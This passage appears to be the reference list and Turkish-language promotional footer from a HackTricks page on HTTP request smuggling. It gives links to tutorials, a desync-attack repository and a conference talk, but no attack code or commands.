* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
